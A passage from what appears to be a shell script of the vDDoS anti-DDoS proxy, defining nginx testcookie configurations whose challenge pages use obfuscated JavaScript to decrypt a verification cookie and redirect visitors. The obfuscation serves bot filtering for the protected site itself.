path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '



			confighighplus2='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 4bc4c61ae885a73c9cea507cbe4fadd0;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>var _0x52a2=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x4E\x47\x4A\x6A\x4E\x47\x4D\x32\x4D\x57\x46\x6C\x4F\x44\x67\x31\x59\x54\x63\x7A\x59\x7A\x6C\x6A\x5A\x57\x45\x31\x4D\x44\x64\x6A\x59\x6D\x55\x30\x5A\x6D\x46\x6B\x5A\x44\x41\x3D"];function toNumbers(_0xc1ddx2){var _0xc1ddx3=[];_0xc1ddx2[_0x52a2[1]](/(..)/g,function(_0xc1ddx2){_0xc1ddx3[_0x52a2[0]](parseInt(_0xc1ddx2,16))});return _0xc1ddx3}function toHex(){for(var _0xc1ddx2=[],_0xc1ddx2=1== arguments[_0x52a2[2]]&& arguments[0][_0x52a2[3]]== Array?arguments[0]:arguments,_0xc1ddx3=_0x52a2[4],_0xc1ddx5=0;_0xc1ddx5< _0xc1ddx2[_0x52a2[2]];_0xc1ddx5++){_0xc1ddx3+= (16> _0xc1ddx2[_0xc1ddx5]?_0x52a2[5]:_0x52a2[4])+ _0xc1ddx2[_0xc1ddx5].toString(16)};return _0xc1ddx3[_0x52a2[6]]()}var a2=atob(_0x52a2[7]),a1=toNumbers(a2),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus2='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 1e4ef768e435d71cb5557fde647750c1;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>var _0xf2aa=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x4D\x57\x55\x30\x5A\x57\x59\x33\x4E\x6A\x68\x6C\x4E\x44\x4D\x31\x5A\x44\x63\x78\x59\x32\x49\x31\x4E\x54\x55\x33\x5A\x6D\x52\x6C\x4E\x6A\x51\x33\x4E\x7A\x55\x77\x59\x7A\x45\x3D"];function toNumbers(_0x3654x2){var _0x3654x3=[];_0x3654x2[_0xf2aa[1]](/(..)/g,function(_0x3654x2){_0x3654x3[_0xf2aa[0]](parseInt(_0x3654x2,16))});return _0x3654x3}function toHex(){for(var _0x3654x2=[],_0x3654x2=1== arguments[_0xf2aa[2]]&& arguments[0][_0xf2aa[3]]== Array?arguments[0]:arguments,_0x3654x3=_0xf2aa[4],_0x3654x5=0;_0x3654x5< _0x3654x2[_0xf2aa[2]];_0x3654x5++){_0x3654x3+= (16> _0x3654x2[_0x3654x5]?_0xf2aa[5]:_0xf2aa[4])+ _0x3654x2[_0x3654x5].toString(16)};return _0x3654x3[_0xf2aa[6]]()}var a2=atob(_0xf2aa[7]),a1=toNumbers(a2),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '



			confighighplus3='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key b36141b8d4a3085cfa41bd8d263f9118;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a1=toNumbers("b36141b8d4a3085cfa41bd8d263f9118"),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus3='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 595f374a4f7798c41ac97685991d3a25;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var a1=toNumbers("595f374a4f7798c41ac97685991d3a25"),b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '



			confighighplus4='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 466b6fbbbda714c128e72320973037ec;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),_0x2aa8=["\x4E\x44\x59\x32\x59\x6A\x5A\x6D\x59\x6D\x4A\x69\x5A\x47\x45\x33\x4D\x54\x52\x6A\x4D\x54\x49\x34\x5A\x54\x63\x79\x4D\x7A\x49\x77\x4F\x54\x63\x7A\x4D\x44\x4D\x33\x5A\x57\x4D\x3D"];a2= atob(_0x2aa8[0]),a1= toNumbers(a2),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus4='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 1e4ef768e435d71cb5557fde647750c1;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),_0xf3bb=["\x4D\x57\x55\x30\x5A\x57\x59\x33\x4E\x6A\x68\x6C\x4E\x44\x4D\x31\x5A\x44\x63\x78\x59\x32\x49\x31\x4E\x54\x55\x33\x5A\x6D\x52\x6C\x4E\x6A\x51\x33\x4E\x7A\x55\x77\x59\x7A\x45\x3D"];a2= atob(_0xf3bb[0]),a1= toNumbers(a2),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '


			confighighplus5='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 4bc4c61ae885a73c9cea507cbe4fadd0;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),_0xebe8=["\x34\x62\x63\x34\x63\x36\x31\x61\x65\x38\x38\x35\x61\x37\x33\x63\x39\x63\x65\x61\x35\x30\x37\x63\x62\x65\x34\x66\x61\x64\x64\x30"];a1= toNumbers(_0xebe8[0]),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus5='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 466b6fbbbda714c128e72320973037ec;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>function toNumbers(d){var e=[];d.replace(/(..)/g,function(d){e.push(parseInt(d,16))});return e}function toHex(){for(var d=[],d=1==arguments.length&&arguments[0].constructor==Array?arguments[0]:arguments,e="",f=0;f
<d.length;f++)e+=(16>d[f]?"0":"")+d[f].toString(16);return e.toLowerCase()}var b1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),b2=toNumbers(b1),_0xe8f2=["\x34\x36\x36\x62\x36\x66\x62\x62\x62\x64\x61\x37\x31\x34\x63\x31\x32\x38\x65\x37\x32\x33\x32\x30\x39\x37\x33\x30\x33\x37\x65\x63"];a1= toNumbers(_0xe8f2[0]),c3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(c3,2,a1,b2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '


			confighighplus6='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key b36141b8d4a3085cfa41bd8d263f9118;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>var _0xdb1b=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x59\x6A\x4D\x32\x4D\x54\x51\x78\x59\x6A\x68\x6B\x4E\x47\x45\x7A\x4D\x44\x67\x31\x59\x32\x5A\x68\x4E\x44\x46\x69\x5A\x44\x68\x6B\x4D\x6A\x59\x7A\x5A\x6A\x6B\x78\x4D\x54\x67\x3D"];function toNumbers(_0xaa36x2){var _0xaa36x3=[];_0xaa36x2[_0xdb1b[1]](/(..)/g,function(_0xaa36x2){_0xaa36x3[_0xdb1b[0]](parseInt(_0xaa36x2,16))});return _0xaa36x3}function toHex(){for(var _0xaa36x2=[],_0xaa36x2=1== arguments[_0xdb1b[2]]&& arguments[0][_0xdb1b[3]]== Array?arguments[0]:arguments,_0xaa36x3=_0xdb1b[4],_0xaa36x5=0;_0xaa36x5< _0xaa36x2[_0xdb1b[2]];_0xaa36x5++){_0xaa36x3+= (16> _0xaa36x2[_0xaa36x5]?_0xdb1b[5]:_0xdb1b[4])+ _0xaa36x2[_0xaa36x5].toString(16)};return _0xaa36x3[_0xdb1b[6]]()}var b2=atob(_0xdb1b[7]),b1=toNumbers(b2),c1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),c2=toNumbers(c1),a3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(a3,2,b1,c2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus6='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 595f374a4f7798c41ac97685991d3a25;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
<script>var _0xe262=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x4E\x54\x6B\x31\x5A\x6A\x4D\x33\x4E\x47\x45\x30\x5A\x6A\x63\x33\x4F\x54\x68\x6A\x4E\x44\x46\x68\x59\x7A\x6B\x33\x4E\x6A\x67\x31\x4F\x54\x6B\x78\x5A\x44\x4E\x68\x4D\x6A\x55\x3D"];function toNumbers(_0x3920x2){var _0x3920x3=[];_0x3920x2[_0xe262[1]](/(..)/g,function(_0x3920x2){_0x3920x3[_0xe262[0]](parseInt(_0x3920x2,16))});return _0x3920x3}function toHex(){for(var _0x3920x2=[],_0x3920x2=1== arguments[_0xe262[2]]&& arguments[0][_0xe262[3]]== Array?arguments[0]:arguments,_0x3920x3=_0xe262[4],_0x3920x5=0;_0x3920x5< _0x3920x2[_0xe262[2]];_0x3920x5++){_0x3920x3+= (16> _0x3920x2[_0x3920x5]?_0xe262[5]:_0xe262[4])+ _0x3920x2[_0x3920x5].toString(16)};return _0x3920x3[_0xe262[6]]()}var b2=atob(_0xe262[7]),b1=toNumbers(b2),c1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),c2=toNumbers(c1),a3=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(a3,2,b1,c2))+"; expires=0; path=/";setTimeout("location.href=\'"'"'$scheme://$host:$server_port$request_uri\'"'"';",5000);
</script>
<center>
<br />
<br />
<center/>
</body>
</html>
'"'"';    
	
	location = /cookies.html {
        root /vddos/html;
    }
	location = /5s.html {
	    root /vddos/html;
	}
	location = /vddosw3data.js {
		gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
	    root /vddos/html;
	}
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '


			confighighplus7='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 125513f7e030a2b123f7f16ef7c6c232;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<html>
<body>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<script>var _0x8def=["\x70\x75\x73\x68","\x72\x65\x70\x6C\x61\x63\x65","\x6C\x65\x6E\x67\x74\x68","\x63\x6F\x6E\x73\x74\x72\x75\x63\x74\x6F\x72","","\x30","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x31\x32\x35\x35\x31\x33\x66\x37\x65\x30\x33\x30\x61\x32\x62\x31\x32\x33\x66\x37\x66\x31\x36\x65\x66\x37\x63\x36\x63\x32\x33\x32"];function toNumbers(_0x3e9ex2){var _0x3e9ex3=[];_0x3e9ex2[_0x8def[1]](/(..)/g,function(_0x3e9ex2){_0x3e9ex3[_0x8def[0]](parseInt(_0x3e9ex2,16))});return _0x3e9ex3}function toHex(){for(var _0x3e9ex2=[],_0x3e9ex2=1== arguments[_0x8def[2]]&& arguments[0][_0x8def[3]]== Array?arguments[0]:arguments,_0x3e9ex3=_0x8def[4],_0x3e9ex5=0;_0x3e9ex5< _0x3e9ex2[_0x8def[2]];_0x3e9ex5++){_0x3e9ex3+= (16> _0x3e9ex2[_0x3e9ex5]?_0x8def[5]:_0x8def[4])+ _0x3e9ex2[_0x3e9ex5].toString(16)};return _0x3e9ex3[_0x8def[6]]()}var b1=toNumbers(_0x8def[7]),c1=atob("%xxxen_testcookie_refresh_encrypt_cookie_iv%"),c2=toNumbers(c1),a1=toNumbers("$testcookie_enc_set");document.cookie="vDDoS="+toHex(slowAES.decrypt(a1,2,b1,c2))+"; expires=0; path=/";location.href="$scheme://$host:$server_port$request_uri";</script>
</body>
</html>
'"'"';    
	location = /cookies.html {
        root /vddos/html;
    }
	
    location = /aes.min.js {
        gzip on;
        gzip_min_length 1000;
        gzip_types text/plain;
        root /vddos/html;
    }
    '

			config5splus7='    testcookie off;
    testcookie_name vDDoS;
    testcookie_secret %testcookie_secret%;
    testcookie_session $remote_addr$http_user_agent;
    testcookie_arg d;
    testcookie_max_attempts 4; testcookie_refresh_status 200;
    testcookie_fallback /cookies.html?backurl=$scheme://$host:$server_port$request_uri;
    testcookie_get_only off; testcookie_expires 0; testcookie_httponly_flag on; testcookie_secure_flag on;
    testcookie_deny_keepalive on;
    testcookie_redirect_via_refresh on;
    testcookie_whitelist {
	%testcookie_whitelist%
    }
    testcookie_refresh_encrypt_cookie on;
    testcookie_refresh_encrypt_cookie_key 595f374a4f7798c41ac97685991d3a25;
    testcookie_refresh_encrypt_cookie_iv %xxxgoc_testcookie_refresh_encrypt_cookie_iv%;
	testcookie_refresh_template '"'"'<!DOCTYPE html>
<html>
<script src="/vddosw3data.js"></script>
<script type=\"text/javascript\" src=\"/aes.min.js\" ></script><noscript><h1 style=\"text-align:center;color:red;\"><strong>Please turn JavaScript on and reload the page.</strong></h1></noscript>
<body>
<div w3-include-html="/5s.html"></div> 
<script>
w3IncludeHTML();
</script>
